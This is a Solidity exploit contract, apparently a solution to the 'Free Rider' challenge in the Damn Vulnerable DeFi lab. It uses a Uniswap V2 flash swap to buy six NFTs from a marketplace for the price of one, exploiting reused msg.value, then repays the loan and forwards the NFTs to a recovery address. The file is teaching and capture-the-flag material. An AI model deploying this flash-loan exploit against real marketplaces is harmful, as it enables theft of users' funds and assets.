// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./FreeRiderNFTMarketplace.sol";
import "../DamnValuableNFT.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "solmate/src/tokens/WETH.sol";

contract FreeRiderAttack is IUniswapV2Callee, IERC721Receiver {
    uint256 public constant NFT_PRICE = 15 ether;

    FreeRiderNFTMarketplace public immutable market;
    address public immutable recovery;
    IUniswapV2Pair immutable pair;
    WETH immutable weth;
    DamnValuableNFT immutable nft;
    address player;

    uint256[] public tokenIds = [0, 1, 2, 3, 4, 5];

    constructor(
        address payable _market,
        address _recovery,
        address _pair,
        address payable _weth,
        address _nft,
        address _player
    ) {
        market = FreeRiderNFTMarketplace(_market);
        recovery = _recovery;
        pair = IUniswapV2Pair(_pair);
        weth = WETH(_weth);
        nft = DamnValuableNFT(_nft);
        player = _player;
    }

    function uniswapV2Call(address, uint256, uint256 amount1, bytes calldata) external override {
        weth.withdraw(amount1);
        market.buyMany{value: amount1}(tokenIds);
        uint256 balance = address(this).balance;
        weth.deposit{value: balance}();
        weth.transfer(address(pair), balance);
    }

    function attack() public {
        bytes memory data = abi.encode(player);
        pair.swap(0, NFT_PRICE, address(this), data);
        for (uint256 i = 0; i < tokenIds.length; i++) {
            nft.safeTransferFrom(address(this), recovery, tokenIds[i], data);
        }
    }

    function onERC721Received(address, address, uint256, bytes calldata) external pure override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
